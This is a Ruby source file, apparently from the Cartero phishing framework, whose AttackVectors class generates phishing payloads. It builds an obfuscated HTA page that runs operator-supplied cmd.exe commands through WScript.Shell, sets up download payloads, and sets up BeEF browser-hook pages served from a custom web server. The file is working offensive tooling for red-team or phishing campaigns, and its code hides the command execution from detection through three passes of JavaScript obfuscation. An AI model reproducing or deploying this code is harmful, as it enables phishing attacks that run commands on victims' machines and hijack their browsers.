#encoding: utf-8
module Cartero
# Documentation for AttackVectors
class AttackVectors
  def initialize(options, payload=nil)
    @options = options
    @options.payload = payload
    @payload = payload
    @options.webserver = File.basename(@options.customwebserver).split('.')[0..-2].join('.').camelize
    case options.attack_type
    when "hta"
      raise StandardError, "Missing Payload for hta attack" if @options.payload.nil?
      $stdout.puts "Generating obfuscated hta payload on #{options.request_path || '/warning.hta'}"
      create_hta_payload
    when "download"
      raise StandardError, "Missing Payload for hta attack" if @options.payload.nil?
      $stdout.puts "Generating #{options.request_path || '/download'}"
      create_download_payload
    when "beef"
      $stdout.puts "Generating smart erb_based beef hooks"
      create_beef_payload
    else
      raise StandardError, "No attack type provided."
    end
  end
  attr_accessor :options
  attr_accessor :payload

  def create_hta_payload
    require 'jsobfu'
    hta = options.path.split('/')[-1] + '_hta'
    if File.read(options.customwebserver).scan("require \"#{options.path + '/' + hta}\"").empty?
      File.open(options.customwebserver,"a") {|x| x << "\n\nrequire \"#{options.path + '/' + hta}\""}
    end

    # Building WebServer Object
    File.open(options.path + "/#{hta}.rb","w") do |x|
      x << ERB.new(File.read(
        File.dirname(__FILE__) + "/../../templates/webserver/hta.erb"
      )).result(options.get_binding)
    end

    # Generating HTA Script using Veil Payload or another CMD Payload
    script = "var c = 'cmd.exe /c #{File.readlines(File.expand_path(payload)).map(&:strip).join(' | ').gsub('\\','\\\\\\')}'; new ActiveXObject('WScript.Shell').Run(c);"

    # Obfucate object using JSObfu with 3 iterations and global this.
    obf_script = JSObfu.new(script).obfuscate(iterations: 3, global: 'this')

    # Write obfucated hta application to views as hta.erb
    File.open(options.views + '/hta.erb', "w" ) {|x| x << "<html>\n<body>\n<script>\n#{obf_script}\n</script>\n</body>\n</html>" }
  end

  def create_download_payload
    download = options.path.split('/')[-1] + '_download'
    if File.read(options.customwebserver).scan("require \"#{options.path + '/' + download}\"").empty?
      File.open(options.customwebserver,"a") {|x| x << "\n\nrequire \"#{options.path + '/' + download}\""}
    end
    File.open(options.path + "/#{download}.rb","w") do |x|
      x << ERB.new(File.read(
        File.dirname(__FILE__) + "/../../templates/webserver/download.erb"
      )).result(options.get_binding)
    end
  end

  def create_beef_payload
    beef_hook = options.path.split('/')[-1] + '_beef_hook'
    if File.read(options.customwebserver).scan("require \"#{options.path + '/' + beef_hook}\"").empty?
      File.open(options.customwebserver,"a") {|x| x << "\n\nrequire \"#{options.path + '/' + beef_hook}\""}
    end

    File.open(options.path + "/#{beef_hook}.rb","w") do |x|
      x << ERB.new(File.read(
        File.dirname(__FILE__) + "/../../templates/webserver/beef_hook.erb"
      )).result(options.get_binding)
    end
  end
end
end
